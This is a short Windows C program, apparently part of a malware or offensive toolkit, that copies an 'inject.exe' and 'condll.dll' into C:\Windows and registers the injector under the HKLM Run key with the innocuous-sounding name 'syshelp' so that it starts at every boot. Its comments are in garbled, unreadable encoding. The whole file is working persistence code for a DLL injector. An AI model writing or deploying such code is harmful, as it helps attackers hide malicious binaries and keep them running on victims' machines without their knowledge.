#include <Windows.h>
#include <stdio.h>

#define EXEPATH "C:\\Windows\\inject.exe"
int 
WINAPI wWinMain(HINSTANCE hInst, HINSTANCE hPreInst, LPWSTR lpCmdLine, int nCmdShow)
//main()
{
	char currentPath[MAX_PATH] = {0};
	char exePath[MAX_PATH] = {0};
	char dllPath[MAX_PATH] = {0};
	GetCurrentDirectory(MAX_PATH, currentPath);
	sprintf_s(exePath, "%s\\inject.exe", currentPath);
	sprintf_s(dllPath, "%s\\condll.dll", currentPath); 
	//Wow64EnableWow64FsRedirection(FALSE);
	
	//����ע������dll��windowsĿ¼��
	int ret1 = CopyFile(exePath, EXEPATH, FALSE);
	int ret2 = CopyFile(dllPath, "C:\\Windows\\condll.dll", FALSE);

	//Wow64EnableWow64FsRedirection(TRUE);

	//������ӿ���������
	char regname[] = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
	HKEY hKey;
	int ret = RegOpenKey(HKEY_LOCAL_MACHINE, regname, &hKey);    //��ע����
	ret = RegSetValueEx(hKey, "syshelp", 0, REG_EXPAND_SZ,
		(unsigned char*)EXEPATH, strlen(EXEPATH)); //���ü�ֵ

	if (ret == 0)
	{
		printf("succes to write reg key.\n");
		RegCloseKey(hKey);
	}
	else
	{
		printf("failed to open regedit.%d\n", ret);
		//return 0;
	}

	printf("%s %d\n%s %d\n%d", exePath, ret1, dllPath, ret2, GetLastError());
	//system("pause");
	return 0;
}